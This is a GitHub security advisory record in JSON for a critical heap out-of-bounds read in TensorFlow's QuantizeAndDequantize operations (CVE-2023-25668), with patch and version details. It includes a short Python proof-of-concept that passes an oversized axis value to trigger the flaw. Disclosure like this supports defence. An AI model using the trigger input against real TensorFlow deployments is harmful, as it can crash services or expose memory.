{
    "ghsaId": "GHSA-gw97-ff7c-9v96",
    "severity": "CRITICAL",
    "summary": "TensorFlow has a heap out-of-buffer read vulnerability in the QuantizeAndDequantize operation",
    "description": "### Impact\nAttackers using Tensorflow can exploit the vulnerability. They can access heap memory which is not in the control of user, leading to a crash or RCE.\nWhen axis is larger than the dim of input, c->Dim(input,axis) goes out of bound.\nSame problem occurs in the QuantizeAndDequantizeV2/V3/V4/V4Grad operations too.\n```python\nimport tensorflow as tf\n@tf.function\ndef test():\n    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],\n    \t\t\t\t\t\t\t\t   input_min=[1.0],\n    \t\t\t\t\t\t\t\t   input_max=[10.0],\n    \t\t\t\t\t\t\t\t   signed_input=True,\n    \t\t\t\t\t\t\t\t   num_bits=1,\n    \t\t\t\t\t\t\t\t   range_given=True,\n    \t\t\t\t\t\t\t\t   round_mode='HALF_TO_EVEN',\n    \t\t\t\t\t\t\t\t   narrow_range=True,\n    \t\t\t\t\t\t\t\t   axis=0x7fffffff)\ntest()\n```\n\n\n\n### Patches\nWe have patched the issue in GitHub commit [7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb](https://github.com/tensorflow/tensorflow/commit/7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n",
    "permalink": "https://github.com/advisories/GHSA-gw97-ff7c-9v96",
    "publishedAt": "2023-03-24T21:57:01Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-gw97-ff7c-9v96"
        },
        {
            "type": "CVE",
            "value": "CVE-2023-25668"
        }
    ]
}